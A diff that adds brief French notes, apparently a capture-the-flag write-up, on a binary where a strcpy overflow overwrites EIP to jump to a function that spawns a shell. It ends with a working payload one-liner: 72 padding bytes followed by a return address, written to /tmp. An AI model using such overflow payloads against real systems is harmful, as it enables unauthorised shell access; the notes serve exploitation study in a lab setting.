@@ -1,0 +1,6 @@
+tout simple celui ci
+
+on voit une fonction n qui call un shell
+on overflow le strcpy pour ecraser l'eip par l'adresse de n blablabla on connait
+
+python -c "print 'a'*72 + '\x54\x84\x04\x08'" > /tmp/6
